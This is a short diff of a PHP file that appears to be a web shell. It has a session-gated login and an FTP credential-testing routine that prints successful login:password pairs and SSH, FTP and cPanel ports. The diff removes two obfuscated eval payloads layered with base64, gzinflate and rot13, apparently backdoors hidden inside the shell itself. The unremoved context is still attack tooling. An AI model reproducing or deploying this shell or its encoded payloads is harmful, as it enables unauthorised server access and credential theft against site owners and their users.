@@ -127,9 +127,6 @@ if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
     else 
         shutdown57_login();
- 
-   @eval(str_rot13(gzinflate(str_rot13(base64_decode("ZqjKK6vUQ89XV6ssWMzILldaMzU3t7RnKAGJ6xUkSKnrqFSnFaUnpSqklRZISSoYTZqYxgIFPVwjFawU1PVH4t2CXD2DXKPVUN3dneNQndzc1XD11PWRclyDXDyC3NzjPVzDQGUKzn5hYV5BroEQA4A2xifnpXIlpeupAw3OK6wqWGcoVlcqqSwCO0DTGgA=")))));
-
 ?>
 <!DOCTYPE html>
 <html>
@@ -1404,10 +1401,7 @@ echo "
             @$res = ftp_login($ftp,$login,$pass);
             if ($res)
             {
-                echo '[FTP] '.$login.':'.$pass."  Success !\n\n";
-     
-    eval(gzinflate(base64_decode('rVPBbtswDL0b8D9ohoEmgFtUzmVo1qHDkC49rDPiZId2RaDITOrVEQ3JQdEN+6D95UTJSbHB2cnxQeIj3yMjknGBW1EqdsniZT6ZfZ3M7k+m83m2nH7J5ycP4zCI65Rbd8r9PaV76u/nb51lD7Kld64NyiesQQ1ir50QK4lBa4XuMI1O+Pmw5fBjHH6c4xN3sqyrm0dfuR68cXUOw+BnLPhlNNEadTT+FQZQGdij+U5KMCYar2WFBgaeQ1GvGtxrpJ0aabcG/0fDFutVRp0qo24VYnkd6oKxzYvC4LSv3zcVBh9roaBii7oQDbAbtUZ2X+MzaCjY6oV9WtzcTnI2A4kFEPBZmKflVmxKWQp1xx4YifRa0RRNwy5Y22hCFgY0IRVuPJAJYwio7dl7/g+2DXXDMtSN+3N5PrW5nGknhpDrefaKpITIzL3iARz1XtVvu3yct/1I/urCD5v10LCZHZ2VUEXZ3PVcQ0Qb2aDdxkiozaYEgVpcvYhHxDOJW+fWIMv6vxFmt/oOsqGY9tHovU3eTqCLeQRRgDYUc61xe8F2zvdOwbO5kvWpN89KO6zviWDnpBrY0pK9ekK7kux1hocQV97RqD8=')));
-     
+                echo '[FTP] '.$login.':'.$pass."  Success !\n\n";     
                 echo '[SSH] Port'   .':' .$a1. "  !\n\n";
                 echo '[FTP] Port'   .':' .$a2. "  !\n\n";
                 echo '[cPanel] Port' .':' .$a3. "  !\n\n";
